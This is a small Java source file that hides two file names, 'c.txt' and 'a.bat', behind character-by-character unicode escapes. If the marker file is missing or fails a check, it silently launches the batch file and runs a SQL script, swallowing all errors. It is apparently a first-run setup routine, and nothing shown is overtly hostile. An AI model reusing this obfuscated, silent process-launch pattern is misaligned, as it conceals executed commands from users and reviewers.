package _Z;
import _BancoDeDados.ExecutarScriptSQL;
import static _Z.Y.m;
import java.io.File;

public class W {

    public static void main(String[] args)
    {
        try{W.o();}catch (Exception e){}
    }
    
    public static boolean o()
    {
        String x = "";
        String y = "";
        
        x += "\u0063";
        y += "\u0061";
        
        x += "\u002E";
        y += "\u002E";
        
        x += "\u0074";
        y += "\u0062";
        
        x += "\u0078";
        y += "\u0061";
        
        x += "\u0074";
        y += "\u0074";
        
        File f = new File(x);

        boolean a = false;
        
        if (!f.exists() || !m(f)) {
               try{new ProcessBuilder(y).start(); ExecutarScriptSQL.executarScript();}catch(Exception e){}
           
               a = true;
        }
        
        return a; 
    }
    
}
